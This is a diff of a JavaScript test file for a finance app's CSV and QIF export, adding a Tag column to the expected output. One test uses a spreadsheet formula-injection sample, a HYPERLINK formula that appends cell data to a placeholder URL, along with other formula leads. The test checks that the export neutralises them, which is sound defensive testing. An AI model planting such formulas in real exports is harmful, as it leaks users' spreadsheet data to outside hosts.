@@ -50,10 +50,10 @@ const META = { firstDate: '2026-01-05', lastDate: '2026-01-07', balance: 2084.51
 test('csv serialiser: signed amounts and RFC 4180 quoting', () => {
   const out = exportHeader('csv', META) + exportBody('csv', SAMPLE);
   const lines = out.split('\r\n').filter(Boolean);
-  assert.equal(lines[0], 'Date,Description,Type,Category,Amount,Notes');
-  assert.equal(lines[1], '2026-01-05,ACME PAYROLL,income,Income,2100.00,');
+  assert.equal(lines[0], 'Date,Description,Type,Category,Amount,Notes,Tag');
+  assert.equal(lines[1], '2026-01-05,ACME PAYROLL,income,Income,2100.00,,');
   // Quotes doubled, field with comma/quote wrapped; expense negative.
-  assert.equal(lines[2], '2026-01-07,"He said ""hi"", twice",expense,,-15.49,a&b <note>');
+  assert.equal(lines[2], '2026-01-07,"He said ""hi"", twice",expense,,-15.49,a&b <note>,');
   assert.equal(exportFooter('csv', META), '');
 });
 
@@ -64,7 +64,7 @@ test('csv serialiser: signed amounts and RFC 4180 quoting', () => {
 test('csv serialiser: neutralises formula leads without touching amounts', () => {
   const nasty = [
     { id: 3, date: '2026-02-01', description: '=HYPERLINK("http://x/"&A1,"Receipt")',
-      amount: 12.5, notes: '@SUM(A1)', tx_type: 'expense', category_name: '+Rent' },
+      amount: 12.5, notes: '@SUM(A1)', tx_type: 'expense', category_name: '+Rent', tag_name: '-Trip' },
     // A negative amount must NOT gain an apostrophe, or every importer that
     // reads the file back breaks on the amount column.
     { id: 4, date: '2026-02-02', description: 'PLAIN SHOP', amount: 8,
@@ -72,8 +72,8 @@ test('csv serialiser: neutralises formula leads without touching amounts', () =>
   ];
   const lines = exportBody('csv', nasty).split('\r\n').filter(Boolean);
   assert.equal(lines[0],
-    '2026-02-01,"\'=HYPERLINK(""http://x/""&A1,""Receipt"")",expense,\'+Rent,-12.50,\'@SUM(A1)');
-  assert.equal(lines[1], '2026-02-02,PLAIN SHOP,expense,,-8.00,');
+    '2026-02-01,"\'=HYPERLINK(""http://x/""&A1,""Receipt"")",expense,\'+Rent,-12.50,\'@SUM(A1),\'-Trip');
+  assert.equal(lines[1], '2026-02-02,PLAIN SHOP,expense,,-8.00,,');
 });
 
 test('csv serialiser: leaves an ordinary leading apostrophe alone', () => {
@@ -83,7 +83,7 @@ test('csv serialiser: leaves an ordinary leading apostrophe alone', () => {
   const rows = [{ id: 5, date: '2026-03-01', description: "'74 Camaro fund",
     amount: 40, notes: '', tx_type: 'expense', category_name: null }];
   const line = exportBody('csv', rows).split('\r\n')[0];
-  assert.equal(line, "2026-03-01,'74 Camaro fund,expense,,-40.00,");
+  assert.equal(line, "2026-03-01,'74 Camaro fund,expense,,-40.00,,");
 });
 
 test('qif serialiser: one ^-terminated record per row, US dates', () => {
@@ -138,8 +138,8 @@ test('export writes a complete CSV file and cleans up the .part', (t) => {
   const lines = fs.readFileSync(dest, 'utf8').split('\r\n').filter(Boolean);
   assert.equal(lines.length, 3);
   // Oldest first, direction derived from the category.
-  assert.equal(lines[1], `2026-01-15,Paycheck,income,${income.name},1000.00,`);
-  assert.equal(lines[2], '2026-02-02,Coffee,expense,,-4.50,morning');
+  assert.equal(lines[1], `2026-01-15,Paycheck,income,${income.name},1000.00,,`);
+  assert.equal(lines[2], '2026-02-02,Coffee,expense,,-4.50,morning,');
 });
 
 test('export of an empty ledger still produces a well-formed file', (t) => {
@@ -216,7 +216,7 @@ test('export with filters writes only the matching rows', (t) => {
   });
   assert.deepEqual({ exported: body.exported, total: body.total }, { exported: 1, total: 1 });
   const lines = fs.readFileSync(dest, 'utf8').split('\r\n').filter(Boolean);
-  assert.deepEqual(lines.slice(1), ['2026-02-02,Coffee Shop,expense,,-4.50,']);
+  assert.deepEqual(lines.slice(1), ['2026-02-02,Coffee Shop,expense,,-4.50,,']);
 
   // tx_type filters on the direction derived from the category.
   dest = path.join(c.dir, 'income.csv');
